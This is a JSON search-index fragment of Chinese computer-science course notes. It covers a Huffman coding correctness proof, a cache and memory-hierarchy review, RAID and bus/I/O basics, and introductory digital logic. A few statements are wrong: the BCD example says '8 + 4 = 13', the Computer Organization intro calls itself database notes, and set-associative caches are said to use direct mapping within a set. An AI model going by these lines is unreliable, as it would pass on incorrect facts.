<p>\u6bcf\u6b21\u9009\u62e9\u9891\u7387\u6700\u5c0f\u7684\u4e24\u4e2a\u5b57\u7b26\u6784\u9020\u4e00\u4e2a\u65b0\u5b57\u7b26\uff0c\u9891\u7387\u4e3a\u4e24\u8005\u4e4b\u548c\uff0c\u76f4\u5230\u53ea\u5269\u4e00\u4e2a\u5b57\u7b26\u3002</p> <p>Proof</p> <p>Lemma</p> <p>\u82e5 \\(x, y\\) \u662f \\(C\\) \u4e2d\u9891\u7387\u6700\u5c0f\u7684\u4e24\u4e2a\u5b57\u7b26\uff0c\u5219\u5b58\u5728\u4e00\u4e2a\u6700\u4f18\u524d\u7f00\u7f16\u7801\uff0c\u4f7f\u5f97 \\(x, y\\) \u7684\u7f16\u7801\u957f\u5ea6\u76f8\u540c\uff0c\u4e14\u53ea\u6709\u6700\u540e\u4e00\u4f4d\u4e0d\u540c\u3002</p> <p>\u5c06 \\(x, y\\) \u548c\u6700\u6df1\u7684\u4e24\u4e2a\u53f6\u5b50\u8282\u70b9\u4ea4\u6362\uff0c\u5f97\u5230\u7684\u671f\u671b\u7f16\u7801\u957f\u5ea6\u4e0d\u4f1a\u589e\u52a0\u3002</p> <p>Lemma</p> <p>\u5c06 \\(x, y\\) \u66ff\u6362\u4e3a\u4e00\u4e2a\u65b0\u5b57\u7b26 \\(z\\)\uff0c\u9891\u7387\u4e3a \\(x, y\\) \u4e4b\u548c\uff0c\u5176\u4e0a\u7684 Trie \u6811\u4e3a \\(T'\\)\uff0c\u90a3\u4e48\u5c06 \\(T'\\) \u4e2d \\(z\\) \u66ff\u6362\u4e3a \\(x, y\\)\uff0c\u5f97\u5230\u7684\u662f\u539f\u5b57\u7b26\u96c6\u7684\u4e00\u4e2a\u6700\u4f18\u524d\u7f00\u7f16\u7801\u6811 \\(T\\)\u3002</p> <p>\u8bbe \\(E(T)\\) \u4e3a \\(T\\) \u7684\u671f\u671b\u7f16\u7801\u957f\u5ea6\uff0c\u5219 \\(E(T) = E(T') + f_x + f_y\\)\u3002</p> <p>\u5047\u8bbe\u5b58\u5728 \\(T''\\) \u4e3a\u539f\u5b57\u7b26\u96c6\u4e0a\u7684\u524d\u7f00\u7f16\u7801\u6811\uff0c\u4f7f\u5f97 \\(E(T'') &lt; E(T)\\)\uff0c\u90a3\u4e48\u5c06 \\(T''\\) \u4e2d \\(x, y\\) \u5408\u5e76\u4e3a \\(z\\)\uff0c\u5f97\u5230 \\(T'''\\)\uff0c\u6709</p> \\[ E(T''') = E(T'') - f_x - f_y &lt; E(T) - f_x - f_y = E(T') \\] <p>\u4e0e \\(T'\\) \u4e3a\u6700\u4f18\u89e3\u77db\u76fe\u3002</p> <p>\u7efc\u4e0a\u4e24\u4e2a Lemma \u5f97\u5230 Huffman \u7f16\u7801\u7684\u6b63\u786e\u6027\u3002</p>"},{"location":"cs/co/","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1","text":"<p>Info</p> <p>\u672c\u6587\u6863\u4e3a\u6570\u636e\u5e93\u7cfb\u7edf\u7684\u5b66\u4e60\u7b14\u8bb0\uff0c\u6388\u8bfe\u6559\u5e08\u4e3a \u5218\u6d77\u98ce \u3002</p>"},{"location":"cs/co/review/","title":"\u590d\u4e60","text":""},{"location":"cs/co/review/#_2","title":"\u5185\u5b58\u5c42\u6b21\u67b6\u6784","text":""},{"location":"cs/co/review/#memory-technology","title":"Memory Technology","text":"<ul> <li>SRAM\uff1a\u9759\u6001\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\uff0c\u6570\u636e\u5b58\u50a8\u5728\u89e6\u53d1\u5668\u4e2d\uff0c\u901f\u5ea6\u5feb\u4f46\u662f\u9700\u8981\u66f4\u5927\u7684\u9762\u79ef</li> <li>DRAM\uff1a\u52a8\u6001\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\uff0c\u6570\u636e\u5b58\u50a8\u5728\u7535\u5bb9\u4e2d\uff0c\u901f\u5ea6\u6162\u4f46\u662f\u9762\u79ef\u5c0f</li> </ul>"},{"location":"cs/co/review/#memory-hierarchy","title":"Memory Hierarchy","text":"<ul> <li>block\uff1a\u8f6c\u79fb\u6570\u636e\u7684\u6700\u5c0f\u5355\u4f4d</li> <li>hit\uff1a\u4e0a\u5c42\u5b58\u50a8\u5668\u627e\u5230\u76ee\u6807\u6570\u636e\uff0c\u4e0d\u7528\u8bbf\u95ee\u4e0b\u5c42\u5b58\u50a8\u5668<ul> <li>hit rate\uff1a\u547d\u4e2d\u7387 = hit / access</li> <li>hit time\uff1a\u8bbf\u95ee\u65f6\u95f4 + \u5224\u65ad\u662f\u5426\u547d\u4e2d\u7684\u65f6\u95f4</li> </ul> </li> <li>miss\uff1a\u4e0a\u5c42\u5b58\u50a8\u5668\u672a\u627e\u5230\u76ee\u6807\u6570\u636e\uff0c\u9700\u8981\u8bbf\u95ee\u4e0b\u5c42\u5b58\u50a8\u5668<ul> <li>miss rate\uff1a\u5931\u6548\u7387 = 1 - \u547d\u4e2d\u7387</li> <li>miss penalty\uff1a\u66ff\u6362\u6570\u636e\u7684\u65f6\u95f4 + \u5c06\u6570\u636e\u8fd4\u56de\u7ed9\u5904\u7406\u5668\u7684\u65f6\u95f4</li> </ul> </li> </ul> <p>\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ol> <li>\u901f\u5ea6\u95ee\u9898\uff1a\u4f7f\u7528 cache</li> <li>\u5bb9\u91cf\u95ee\u9898\uff1a\u4f7f\u7528\u865a\u62df\u5185\u5b58 Virtual Memory</li> </ol>"},{"location":"cs/co/review/#cache","title":"Cache","text":"<p>\u5730\u5740\u90fd\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d</p> <ul> <li>cache line\uff1a\u7f13\u5b58\u884c\uff0ccache \u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u6700\u5c11\u5305\u62ec valid bit\u3001tag\u3001data</li> <li> <p>\u5730\u5740\u5212\u5206\uff1atag + index + offset</p> <ul> <li>offset\uff1a\u53d6\u51b3\u4e8e cache line \u4e2d data \u6bb5\u7684\u5927\u5c0f\uff0c\u5982 data \u4e3a 64 \u5b57\u8282\uff0c\u5219 offset \u4e3a 6 \u4f4d</li> <li>index\uff1a\u53d6\u51b3\u4e8e cache \u7684\u5927\u5c0f\u548c\u7ec4\u6570</li> <li>tag\uff1a\u5269\u4e0b\u7684\u90e8\u5206\uff0c\u7528\u4e8e\u6bd4\u8f83\u662f\u5426\u547d\u4e2d</li> </ul> </li> <li> <p>Direct-Mapped Cache\uff1a\u76f4\u63a5\u6620\u5c04\u7f13\u5b58\uff0c\u6bcf\u4e2a block \u53ea\u80fd\u6620\u5c04\u5230\u4e00\u4e2a cache line</p> </li> <li>Fully Associative Cache\uff1a\u5168\u76f8\u8054\u7f13\u5b58\uff0c\u6bcf\u4e2a block \u53ef\u4ee5\u6620\u5c04\u5230\u4efb\u610f\u4e00\u4e2a cache line</li> <li>Set Associative Cache\uff1a\u7ec4\u76f8\u8054\u7f13\u5b58\uff0ccache \u88ab\u5212\u5206\u4e3a\u591a\u4e2a\u7ec4\uff0c\u6bcf\u4e2a block \u53ef\u4ee5\u6620\u5c04\u5230\u67d0\u4e2a\u7ec4\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a cache line\uff0c\u7ec4\u5185\u91c7\u7528\u76f4\u63a5\u6620\u5c04\uff0c\u7ec4\u7684\u5927\u5c0f\u79f0\u4e3a ways\u3002\u5730\u5740\u4e2d index \u4e3a\u7ec4\u53f7</li> </ul>"},{"location":"cs/co/review/#block-replacement","title":"Block Replacement","text":"<ul> <li>Random Replacement\uff1a\u968f\u673a\u66ff\u6362</li> <li>LRU Replacement\uff1a\u6700\u8fd1\u6700\u5c11\u4f7f\u7528\u66ff\u6362\uff0c\u9700\u8981\u5728\u6bcf\u4e2a cache line \u4e2d\u7ef4\u62a4 lru bits</li> <li>FIFO Replacement\uff1a\u5148\u8fdb\u5148\u51fa\u66ff\u6362</li> </ul>"},{"location":"cs/co/review/#write-policy","title":"Write Policy","text":"<ul> <li>Write-Through\uff1a\u5199\u76f4\u8fbe\uff0c\u5199\u5165 cache \u540c\u65f6\u5199\u5165\u4e3b\u5b58\uff0ccache \u4e2d\u7684\u6570\u636e\u6c38\u8fdc\u662f\u6700\u65b0\u7684</li> <li>Write-Back\uff1a\u5199\u56de\uff0c\u5199\u5165 cache \u540e\u4e0d\u5199\u5165\u4e3b\u5b58\uff0c\u53ea\u6709\u5f53 cache line \u88ab\u66ff\u6362\u65f6\u624d\u5199\u5165\u4e3b\u5b58\uff0c\u9700\u8981\u989d\u5916\u7684 dirty bit</li> </ul> <p>\u5199\u56de\u9700\u8981\u65f6\u95f4\uff0cCPU \u4f1a\u8fdb\u884c write stall \u7b49\u5f85\u5199\u76f4\u8fbe\u5b8c\u6210\uff0c\u53ef\u4ee5\u4f7f\u7528 write buffer \u7f13\u89e3\u3002\u526f\u4f5c\u7528\uff1a\u8bfb\u7684\u65f6\u5019\u9700\u8981\u5728 buffer \u4e2d\u4e5f\u67e5\u627e\u3002</p> <p>\u5f53\u53d1\u751f write miss \u65f6\uff0c\u6709\u4e24\u79cd\u7b56\u7565\uff1a</p> <ul> <li>Write Allocate\uff1a\u5199\u5206\u914d\uff0c\u5c06 block \u8bfb\u5165 cache \u540e\u518d\u5199\u5165\uff0c\u5e38\u4e0e write-back \u7ed3\u5408</li> <li>Write Around\uff1a\u5199\u7ed5\u8fc7\uff0c\u76f4\u63a5\u5199\u5165\u4e3b\u5b58\uff0c\u4e0d\u8bfb\u5165 cache</li> </ul>"},{"location":"cs/co/review/#memory-system-to-support-cache","title":"Memory System to Support Cache","text":"<p>\u4e0d\u540c memory \u67b6\u6784</p> <ol> <li> <p>Performance basic memory organization</p> <p>CPU - cache - memory</p> <ul> <li>\u5047\u8bbe<ul> <li>1 cycle send address to cache</li> <li>15 cycles for each DRAM access initiated by cache</li> <li>1 cycle to send data</li> <li>block size 4 words</li> </ul> </li> <li>\u90a3\u4e48<ul> <li>transfer \u4e00\u4e2a block \u7684\u9700\u8981 \\(1 + 15 + 1 = 17\\) cycles</li> <li>miss penalty \u4e3a \\(1 + 4 \\times (15 + 1) = 65\\) cycles</li> <li>\u5e26\u5bbd bandwidth \u4e3a \\(\\frac{4 \\times 4}{65} \\approx 0.25\\) words/cycle</li> </ul> </li> <li>Performance in Wider Main Memory</li> </ul> <p>CPU - cache - multiple caches - memory</p> <ul> <li>\u4e00\u6b21\u53ef\u4ee5\u8bfb\u51fa\u4e24\u4e2a word<ul> <li>miss penalty \u4e3a \\(1 + 2 \\times (15 + 1) = 33\\) cycles</li> <li>\u5e26\u5bbd bandwidth \u4e3a \\(\\frac{4 \\times 4}{33} \\approx 0.48\\) words/cycle</li> </ul> </li> <li>\u4e00\u6b21\u6027\u8bfb\u51fa 4 \u4e2a word<ul> <li>miss penalty \u4e3a \\(1 + 15 + 1 = 17\\) cycles</li> <li>\u5e26\u5bbd bandwidth \u4e3a \\(\\frac{4 \\times 4}{17} \\approx 0.98\\) words/cycle</li> </ul> </li> <li>Performance in Four-way interleaved memory</li> </ul> <p>CPU - cache - 4 memory banks</p> <p>4 \u4e2a memory bank\uff0c\u4f9d\u6b21\u8fdb\u884c\u8bfb\u53d6\uff0c\u5e76\u884c\u8bbf\u95ee</p> <ul> <li>miss penalty \u4e3a \\(1 + 15 + 4 \\times 1 = 20\\) cycles</li> <li>\u5e26\u5bbd bandwidth \u4e3a \\(\\frac{4 \\times 4}{20} = 0.8\\) words/cycle</li> </ul> </li> </ol>"},{"location":"cs/co/review/#measuring-and-improving-cache-performance","title":"Measuring and improving cache performance","text":""},{"location":"cs/co/review/#measuring-cache-performance","title":"Measuring cache performance","text":"<ul> <li> <p>Average memory access time</p> \\[ \\begin{aligned} \\mathrm{AMAT} &amp;= \\mathrm{hitTime} + \\mathrm{missTime} \\\\ &amp;= \\mathrm{hitRate} \\times \\mathrm{cacheTime} + \\mathrm{missRate} \\times \\mathrm{memoryTime} \\end{aligned} \\] </li> <li> <p>CPU Time = (CPU execution clock cycles + Memory stall clock cycles) \\(\\times\\) clock cycle time</p> </li> <li>Memory stall clock cycles = Number of instructions \\(\\times\\) miss rate \\(\\times\\) miss penalty = read stall cycles + write stall cycles<ul> <li>Read stall cycles = \\(\\displaystyle\\frac{\\text{Reads}}{\\text{Program}} \\times\\) read miss rate \\(\\times\\) read miss penalty</li> <li>Write stall cycles = \\(\\displaystyle\\frac{\\text{Writes}}{\\text{Program}} \\times\\) write miss rate \\(\\times\\) write miss penalty + write buffer stall cycles<ul> <li>\u5982\u679c cache block size \u4e3a\u4e00\u4e2a word\uff0c\u90a3\u4e48 write miss penalty \u4e3a 0</li> </ul> </li> <li> <p>\u5ffd\u7565 write buffer stall cycles \u6709</p> \\[ \\begin{aligned} \\text{Memory stall clock cycles} &amp;= \\frac{\\text{Memory accesses}}{\\text{Program}} \\times \\text{miss rate} \\times \\text{miss penalty} \\\\ &amp;= \\frac{\\text{Instructions}}{\\text{Program}} \\times \\frac{\\text{Misses}}{\\text{Instruction}} \\times \\text{miss penalty} \\end{aligned} \\] </li> </ul> </li> </ul>"},{"location":"cs/co/review/#improving-cache-performance","title":"Improving Cache Performance","text":"<p>\u63d0\u9ad8 cache \u547d\u4e2d\u7387\uff0c\u51cf\u5c0f penalty.</p> <ul> <li>Reducing cache misses by more flexible placement of blocks \u7075\u6d3b\u7684 block \u653e\u7f6e<ul> <li>\u4f7f\u7528 set-associative cache \u66ff\u4ee3 direct-mapped cache</li> </ul> </li> <li>Reducing the miss penalty using multilevel caches \u591a\u7ea7\u7f13\u5b58<ul> <li>\u589e\u52a0 L2 cache</li> </ul> </li> </ul>"},{"location":"cs/co/review/#virtual-memory","title":"Virtual Memory","text":"<p>\u628a\u4e3b\u5b58\u5f53\u4f5c\u78c1\u76d8\u7f13\u5b58\u3002\u91c7\u7528\u5168\u76f8\u8054 LRU \u66ff\u6362\u3002</p> <p>Page Table\uff1a\u5c06\u865a\u62df\u5730\u5740\u6620\u5c04\u5230\u7269\u7406\u5730\u5740</p> <p>\u6bcf\u4e00\u4e2a process \u90fd\u6709\u81ea\u5df1\u7684 page table\uff0c\u548c\u4e00\u4e2a page table base register \u6307\u5411 page table\u3002</p> <p>\u8ba1\u7b97\u9875\u8868\u5927\u5c0f</p> <ul> <li>\u865a\u62df\u5730\u5740 32 \u4f4d</li> <li>\u9875\u5927\u5c0f 4 KB</li> <li>\u9875\u8868\u4e2d\u6bcf\u6761 entry size 4 bytes</li> </ul> <p>\u9875\u8868\u4e2d entry \u4e2a\u6570\u4e3a \\(2^{32} / 2^{12} = 2^{20}\\)\uff0c\u9875\u8868\u5927\u5c0f\u4e3a \\(2^{20} \\times 4 = 4 MB\\)</p>"},{"location":"cs/co/review/#tlb","title":"TLB","text":"<p>Translation Lookaside Buffer\uff0c\u7f13\u5b58 page table entry\u3002\u770b\u4f5c Page table \u7684 cache\uff0c\u4e00\u822c 16-512 entries.</p>"},{"location":"cs/co/review/#io","title":"\u5b58\u50a8\u548c I/O","text":""},{"location":"cs/co/review/#amdahls-law","title":"Amdahl's Law","text":"<p>\u4e32\u884c\u90e8\u5206\u7684\u6bd4\u4f8b\u51b3\u5b9a\u4e86\u52a0\u901f\u7684\u4e0a\u9650\u3002</p> <p>\u591a\u6838\u52a0\u901f</p> <p>100 \u4e2a CPU\uff0c\u8981\u52a0\u901f 90 \u500d\uff0c\u6c42\u4e32\u884c\u90e8\u5206\u6bd4\u4f8b\u3002</p> <p>\\(T_{\\text{new}} = \\frac{T_{\\text{parallelizable}}}{100} + T_{\\text{serial}}\\)</p> \\[ \\begin{aligned} \\text{Speedup} &amp;= \\frac{T_{\\text{parallelizable}} + T_{\\text{serial}}}{\\frac{T_{\\text{parallelizable}}}{100} + T_{\\text{serial}}} \\\\ &amp;= \\frac{1}{\\frac{f_{\\text{parallelizable}}}{100} + (1 - f_{\\text{parallelizable}})} = 90 \\end{aligned} \\] <p>\u89e3\u5f97 \\(f_{\\text{parallelizable}} = 0.999\\)\uff0c\u4e32\u884c\u90e8\u5206\u6bd4\u4f8b\u4e3a 0.1%</p>"},{"location":"cs/co/review/#accesse-time","title":"Accesse Time","text":"<ul> <li>Seek Time\uff1a\u5bfb\u9053\u65f6\u95f4\uff0c\u78c1\u5934\u79fb\u52a8\u5230\u76ee\u6807\u78c1\u9053\u7684\u65f6\u95f4</li> <li>Rotational Latency\uff1a\u65cb\u8f6c\u5ef6\u8fdf\uff0c\u7b49\u5f85\u76ee\u6807\u6570\u636e\u65cb\u8f6c\u5230\u78c1\u5934\u4e0b\u7684\u65f6\u95f4</li> <li>Transfer Time\uff1a\u4f20\u8f93\u65f6\u95f4\uff0c\u8bfb\u53d6\u6570\u636e\u7684\u65f6\u95f4</li> <li>Controller Time\uff1a\u63a7\u5236\u5668\u65f6\u95f4\uff0c\u5904\u7406\u6570\u636e\u7684\u65f6\u95f4</li> </ul> <p>\u603b\u7684\u8bbf\u95ee\u65f6\u95f4\u4e3a\u4e0a\u8ff0\u56db\u8005\u4e4b\u548c\u3002</p>"},{"location":"cs/co/review/#flash-memory","title":"Flash Memory","text":"<p>\u4e0d\u6613\u5931\u6027\u5b58\u50a8\u5668\uff0c\u8bfb\u53d6\u901f\u5ea6\u5feb</p> <ul> <li>NOR Flash\uff1a\u968f\u673a\u8bfb\u53d6\uff0c\u4f5c\u4e3a\u6307\u4ee4\u5b58\u50a8</li> <li>NAND Flash\uff1a\u4ee5\u5757\u4e3a\u5355\u4f4d\u8bfb\u53d6\uff0c\u4f5c\u4e3a\u6570\u636e\u5b58\u50a8</li> </ul>"},{"location":"cs/co/review/#dependablity","title":"Dependablity","text":"<p>\u53ef\u9760\u6027</p> <ul> <li>MTTF\uff1aMean Time To Failure\uff0c\u5e73\u5747\u65e0\u6545\u969c\u65f6\u95f4</li> <li>MTTR\uff1aMean Time To Repair\uff0c\u5e73\u5747\u4fee\u590d\u65f6\u95f4</li> <li>MTBF\uff1aMean Time Between Failure\uff0c\u5e73\u5747\u6545\u969c\u95f4\u9694 = MTTF + MTTR</li> </ul> <p>\u53ef\u7528\u65f6\u95f4\u4e3a \\(\\frac{MTTF}{MTTF + MTTR}\\)</p>"},{"location":"cs/co/review/#redundant-arrays-of-inexpensive-disks","title":"Redundant Arrays of Inexpensive Disks","text":"<p>\u78c1\u76d8\u9635\u5217\uff0c\u80fd\u591f\u540c\u65f6\u8bbf\u95ee</p> <ul> <li>RAID 0\uff1a\u6570\u636e\u5206\u5757\u5b58\u50a8\uff0c\u63d0\u9ad8\u8bfb\u5199\u901f\u5ea6</li> <li>RAID 1\uff1a\u6bcf\u4e00\u4e2a\u76d8\u7684\u6570\u636e\u90fd\u6709\u5907\u4efd\uff0c\u5199\u7684\u65f6\u5019\u540c\u65f6\u5199\u5165\u4e24\u4e2a\u76d8</li> <li>RAID 3\uff1a\u5bf9\u6570\u636e\u76d8\u4e0a\u7684\u6570\u636e\u4f4d\u8fdb\u884c\u5947\u5076\u6821\u9a8c\uff0c\u5b58\u50a8\u5728\u53e6\u4e00\u4e2a\u76d8\u4e0a\uff0c\u4f46\u6545\u969c\u65f6\u4e0d\u77e5\u9053\u5177\u4f53\u662f\u54ea\u4e00\u4e2a\u76d8\u51fa\u4e86\u95ee\u9898</li> <li>RAID 4\uff1a\u6bcf\u4e2a\u76d8\u7684\u6821\u9a8c\u4f4d\u6ca1\u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u51fa\u9519\u65f6\u53ef\u4ee5\u77e5\u9053\u5177\u4f53\u662f\u54ea\u4e00\u4e2a\u76d8\u51fa\u4e86\u95ee\u9898</li> <li>RAID 5\uff1a\u5c06\u6821\u9a8c\u4f4d\u5206\u6563\u5b58\u50a8\u5728\u6240\u6709\u76d8\u4e0a\uff0c\u63d0\u9ad8\u8bfb\u5199\u901f\u5ea6</li> <li>RAID 6\uff1a\u4e24\u4e2a\u6821\u9a8c\u4f4d\uff0c\u63d0\u9ad8\u5bb9\u9519\u80fd\u529b\uff0c\u4f46\u662f\u5199\u5165\u901f\u5ea6\u6162</li> </ul>"},{"location":"cs/co/review/#bus","title":"Bus","text":"<p>Synchronous vs. Asynchronous</p> <ul> <li>Synchronous \u540c\u6b65\u603b\u7ebf\uff1a\u6240\u6709\u8bbe\u5907\u9891\u7387\u4e00\u81f4</li> <li> <p>Asynchronous \u5f02\u6b65\u603b\u7ebf\uff1a\u4f7f\u7528 handshake \u534f\u8bae</p> <p>\u8bfb\u6570\u636e\u65f6\uff1a</p> <ol> <li>CPU \u62c9\u8d77 read request\uff0c\u5e76\u5c06\u5730\u5740\u653e\u5728 data bus \u4e0a</li> <li>\u8bbe\u5907\u63a5\u6536\u5230 read request\uff0c\u8bfb\u53d6 data bus \u4e0a\u7684\u5730\u5740\uff0c\u62c9\u8d77 ack \u4fe1\u53f7\u8868\u793a\u6536\u5230 read request</li> <li>CPU \u6536\u5230 ack \u4fe1\u53f7\uff0c\u590d\u4f4d read request\uff0c\u7b49\u5f85\u6570\u636e\uff1b\u5185\u5b58\u770b\u5230 read request \u590d\u4f4d\uff0c\u5c06 ack \u4fe1\u53f7\u62c9\u4f4e</li> <li>\u8bbe\u5907\u8bfb\u51fa\u6570\u636e\uff0c\u653e\u5728 data bus \u4e0a\uff0c\u62c9\u8d77 data ready \u4fe1\u53f7</li> <li>CPU \u770b\u5230 data ready \u4fe1\u53f7\uff0c\u8bfb\u53d6 data bus \u4e0a\u7684\u6570\u636e\uff0c\u62c9\u8d77 ack \u4fe1\u53f7\u8868\u793a\u6536\u5230\u6570\u636e</li> <li>\u8bbe\u5907\u6536\u5230 ack \u4fe1\u53f7\uff0c\u590d\u4f4d data ready \u4fe1\u53f7\uff1bCPU \u770b\u5230 data ready \u4fe1\u53f7\u590d\u4f4d\uff0c\u5c06 ack \u4fe1\u53f7\u62c9\u4f4e</li> </ol> </li> </ul>"},{"location":"cs/co/review/#performance","title":"Performance","text":"<p>\u5e26\u5bbd bandwidth = \u6570\u636e\u4f20\u8f93\u91cf / \u4f20\u8f93\u65f6\u95f4</p> <ul> <li>Increasing data bus width</li> <li>Use separate address and data lines</li> <li>transfer multiple words</li> </ul>"},{"location":"cs/co/review/#io_1","title":"I/O","text":"<p>CPU \u901a\u8fc7 I/O \u5730\u5740\u8bbf\u95ee\u8bbe\u5907\uff08\u8fd9\u4e2a\u5730\u5740\u4e0d\u80fd\u8fdb\u5165 cache\uff0c\u8981\u4fdd\u6301\u6700\u65b0\uff09</p> <p>\u4ea4\u4e92\u65b9\u5f0f\uff1a</p> <ul> <li>Polling\uff1aCPU \u4e0d\u65ad\u67e5\u8be2\u8bbe\u5907\u72b6\u6001</li> <li>Interrupts\uff1a\u8bbe\u5907\u5b8c\u6210\u540e\u53d1\u9001\u4e2d\u65ad\u4fe1\u53f7\u7ed9 CPU</li> <li>DMA\uff1a\u76f4\u63a5\u5185\u5b58\u8bbf\u95ee\uff0c\u8bbe\u5907\u76f4\u63a5\u8bbf\u95ee\u5185\u5b58\uff0c\u4e0d\u9700\u8981 CPU \u53c2\u4e0e</li> </ul>"},{"location":"cs/computer_logic/","title":"\u8ba1\u7b97\u673a\u903b\u8f91\u8bbe\u8ba1\u57fa\u7840","text":"<p>Info</p> <p>\u672c\u6587\u6863\u4e3a\u8ba1\u7b97\u673a\u903b\u8f91\u8bbe\u8ba1\u57fa\u7840\u7684\u5b66\u4e60\u7b14\u8bb0\uff0c\u6388\u8bfe\u6559\u5e08\u4e3a \u8463\u4e9a\u6ce2 \u3002</p> <p>\u5b9e\u9a8c\u62a5\u544a</p> <ul> <li>\u6570\u5b66\u57fa\u7840<ul> <li>\u5e03\u5c14\u4ee3\u6570</li> <li>\u903b\u8f91\u4ee3\u6570\u57fa\u7840</li> </ul> </li> <li>\u5355\u5143\u7535\u8def<ul> <li>\u903b\u8f91\u95e8\u7535\u8def\u3001\u89e6\u53d1\u5668</li> <li>\u6027\u80fd\u5206\u6790\u548c\u5e94\u7528</li> </ul> </li> <li>\u7ec4\u5408\u903b\u8f91\u7535\u8def\u7684\u5206\u6790\u3001\u8bbe\u8ba1\u4e0e\u5e94\u7528</li> <li>\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u7684\u5206\u6790\u3001\u8bbe\u8ba1\u4e0e\u5e94\u7528</li> <li>\u6570\u5b57\u786c\u4ef6\u5b9e\u73b0</li> <li>\u5bc4\u5b58\u5668\u548c\u5bc4\u5b58\u5668\u4f20\u8f93</li> <li>\u5185\u5b58\u57fa\u7840</li> </ul> Quiz 1 <p></p> Quiz 2 <p></p> Quiz 3 <p></p> Quiz 4 <p></p> <p></p>"},{"location":"cs/computer_logic/chapter1/","title":"Digital Systems and Information","text":""},{"location":"cs/computer_logic/chapter1/#digital-systems","title":"Digital Systems \u6570\u5b57\u7cfb\u7edf","text":"<p>Discrete Information Processing System \u79bb\u6563\u4fe1\u606f\u5904\u7406\u7cfb\u7edf</p> <p>\u63a5\u53d7\u79bb\u6563\u8f93\u5165\uff0c\u4ea7\u751f\u79bb\u6563\u8f93\u51fa\u3002</p> <p>System State \u4fdd\u5b58\u72b6\u6001\uff08\u5185\u5b58\uff09</p>"},{"location":"cs/computer_logic/chapter1/#type-of-digital-systems","title":"Type of Digital Systems","text":"<ul> <li>No state present \u6ca1\u6709\u72b6\u6001\u7684\u7cfb\u7edf</li> </ul> <p>\u7ec4\u5408\u903b\u8f91\u7cfb\u7edf Combinational Logical System</p> <p>Output = F(Input)</p> <ul> <li>State system</li> </ul> <p>\u5206\u7c7b\u4f9d\u636e\uff1a\u72b6\u6001\u66f4\u65b0\u65f6\u673a</p> <ul> <li> <p>State update at discrete times</p> <p>Synchronous Sequential System \u540c\u6b65\u65f6\u5e8f\u7cfb\u7edf</p> </li> <li> <p>State updated at any times</p> <p>Asyn Sequential System \u5f02\u6b65\u65f6\u5e8f\u7cfb\u7edf</p> </li> </ul> <p>\u72b6\u6001\u66f4\u65b0 State = F(State, Input)</p> <p>\u8f93\u51fa Output = F(State) or F(State, Input)</p> <p>Computer: Syn, \u4e3b\u9891\uff1a\u66f4\u65b0\u72b6\u6001\u9891\u7387</p> <ul> <li>Embedded System \u5d4c\u5165\u5f0f\u7cfb\u7edf</li> </ul> <p>\u8f93\u5165\u8f93\u51fa\u901a\u5e38\u548c\u7269\u7406\u4e16\u754c\u76f4\u63a5\u76f8\u8fde\uff0c\u5982\u6536\u97f3\u3001\u4f20\u611f\u5668\u3002</p> <p>\u6a21\u62df\u4fe1\u53f7-&gt;\u6570\u5b57\u4fe1\u53f7</p> <ol> <li>\u5468\u671f\u91c7\u6837\uff08\u9999\u519c\u91c7\u6837\u5b9a\u7406\uff1a\u91c7\u6837\u9891\u7387\u9ad8\u4e8e\u4fe1\u53f7\u6700\u9ad8\u9891\u7387\u7684\u4e24\u500d\u4ee5\u4e0a\uff09</li> <li>\u91cf\u5316\uff1a\u4e8c\u8fdb\u5236\u5e8f\u5217\u91cf\u5316\uff080-5V \u5185\u5206\u4e3a 16 \u4efd\uff0c\u7528\u4e8c\u8fdb\u5236\u8868\u793a\uff09</li> </ol> <p>Signal Examples Over Time</p> <ol> <li>Analog \u6a21\u62df\u4fe1\u53f7: Continuous in value &amp; time</li> <li>Digital \u6570\u5b57\u4fe1\u53f7: Syn \u540c\u6b65\u3001Asyn \u5f02\u6b65</li> </ol> <p>Threshold Region \u566a\u58f0\u5bb9\u9650\uff1a\u589e\u52a0\u4f20\u8f93\u8fc7\u7a0b\u6297\u5e72\u6270\u80fd\u529b</p>"},{"location":"cs/computer_logic/chapter1/#binary-arithmetic","title":"Binary Arithmetic","text":"<ul> <li> <p>Addition   Carries</p> </li> <li> <p>Subtraction   Borrows</p> </li> <li> <p>Multiplication</p> </li> <li> <p>Convert   \u9664\u4ee5 base \u53d6\u6574</p> </li> </ul>"},{"location":"cs/computer_logic/chapter1/#binary-coding","title":"Binary Coding","text":"<p>\u4e8c\u8fdb\u5236\u7f16\u7801</p> <ul> <li> <p>\u975e\u6570\u503c\u7f16\u7801 Non-numeric   \u4e0d\u8868\u793a\u6570\u503c\uff08\u8868\u793a\u989c\u8272\u3001\u7b26\u53f7\u7b49\uff09</p> </li> <li> <p>\u6570\u503c\u7f16\u7801 Numeric</p> </li> <li>8,4,-2,-1 Code \u6bcf\u4e00\u4f4d\u6709\u4f4d\u6743\u3002</li> <li>Excess 3 Code</li> </ul> <p>\u6bcf\u4e2a\u6570\u5b57\u6982\u7387\u76f8\u540c\uff0c1 \u51fa\u73b0\u7684\u6982\u7387\u76f8\u540c</p> <ul> <li> <p>BCD \u7801\uff088,4,2,1 Code\uff09     \u6bcf\u4e00\u5341\u8fdb\u5236\u6570\u4f4d\u7528\u4e8c\u8fdb\u5236\u8868\u793a     \u4f18\u70b9\uff1a\u548c\u4eba\u4ea4\u4e92\u66f4\u76f4\u89c2</p> </li> <li> <p>BCD Arithmentic   \u8fdb\u4f4d\uff1a8 + 4 = 13 &gt; 9   13 + 6 -&gt; 1101 + 6 -&gt; 10011 -&gt; 10000 + 3</p> </li> <li> <p>ASCII Code   7 \u4f4d\u4e8c\u8fdb\u5236   '0'-&gt;0x30   'A'-&gt;0x41   'a'-&gt;0x61</p> </li> </ul>"},{"location":"cs/computer_logic/chapter1/#parity-bit-error-detection-codes","title":"Parity Bit Error-Detection Codes","text":"<p>\u68c0\u6d4b\u4f20\u8f93\u4fe1\u606f\u6b63\u786e\u6027 Error Detection.</p> <p>\u539f\u7406\uff1a\u5197\u4f59\u4fe1\u606f Redundancy</p> 